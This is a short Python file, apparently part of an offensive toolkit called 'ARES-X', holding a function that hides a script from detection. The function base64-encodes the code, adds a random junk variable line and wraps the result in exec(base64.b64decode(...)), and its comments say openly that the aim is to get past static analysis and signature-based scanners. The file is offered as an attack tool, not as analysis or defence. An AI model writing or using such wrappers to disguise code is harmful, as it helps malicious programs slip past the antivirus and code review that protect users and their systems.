# ARES-X File 21: Polymorphic Code Encoder
import base64
import random

def obfuscate_script(raw_code):
    """Encodes script in multiple layers to bypass basic static analysis."""
    encoded = base64.b64encode(raw_code.encode()).decode()
    # Adding 'junk' logic to confuse signature-based scanners
    junk = f"var_{random.randint(100,999)} = 'ARES-X';"
    return f"{junk}\nimport base64;exec(base64.b64decode('{encoded}'))"
